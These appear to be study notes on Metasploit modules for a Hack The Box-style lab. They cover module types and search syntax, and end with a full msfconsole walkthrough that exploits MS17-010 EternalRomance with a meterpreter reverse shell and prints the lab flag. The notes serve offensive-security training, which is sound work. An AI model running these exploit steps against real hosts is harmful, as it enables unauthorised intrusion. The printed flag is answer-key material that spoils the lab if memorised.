# Modules
Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.

## Type
The Type tag is the first level of segregation between the Metasploit modules. Looking at this field, we can tell what the piece of code for this module will accomplish.
|Type|Description|
|-|-|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|

## OS
The OS tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

## Service
The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the `auxiliary` or `post` ones, this tag can refer to a more general activity such as `gather`, referring to the gathering of credentials, for example.

## Name
Finally, the `Name` tag explains the actual action that can be performed using this module created for a specific purpose.

## MSF - Specific Search
Use the help for more search options:
```
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]
```
```
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

## MSF - Module Information
```
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

  ...
```

## MSF - Target
Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.
```
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

## MSF - Permanent Target Specification
```
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

## Questions
1. Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer. **Answer: HTB{MSF-W1nD0w5-3xPL01t4t10n}**
   - Use `msfconsole` to exploit the target:
```
msf >> search EternalRom

Matching Modules
================

   #   Name                                  Disclosure Date  Rank    Check  Description
   -   ----                                  ---------------  ----    -----  -----------
   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1     \_ target: Automatic                .                .       .      .
   2     \_ target: PowerShell               .                .       .      .
   3     \_ target: Native upload            .                .       .      .
   4     \_ target: MOF upload               .                .       .      .
   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
   6     \_ AKA: ETERNALROMANCE              .                .       .      .
   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
   8     \_ AKA: ETERNALBLUE                 .                .       .      .
   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
   11    \_ AKA: ETERNALROMANCE              .                .       .      .
   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
   13    \_ AKA: ETERNALBLUE                 .                .       .      .


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/smb/ms17_010_command

msf >> use 6
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.129.197.204
RHOSTS => 10.129.197.204
msf exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.82
LHOST => 10.10.14.82
msf exploit(windows/smb/ms17_010_psexec) >> options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                         Required  Description
   ----                  ---------------                         --------  -----------
   DBGTRACE              true                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                      yes       How many times to try to leak transaction
   NAMEDPIPE                                                     no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/w  yes       List of named pipes to check
                         ordlists/named_pipes.txt
   RHOSTS                10.129.197.204                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                                                           loit/basics/using-metasploit.html
   RPORT                 445                                     yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                           no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                          no        The service display name
   SERVICE_NAME                                                  no        The service name
   SHARE                 ADMIN$                                  yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a n
                                                                           ormal read/write folder share
   SMBDomain             .                                       no        The Windows domain to use for authentication
   SMBPass                                                       no        The password for the specified username
   SMBUser                                                       no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.82      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_psexec) >> run
(C:\Users\Administrator\Desktop) > cat flag.txt
HTB{MSF-W1nD0w5-3xPL01t4t10n}
```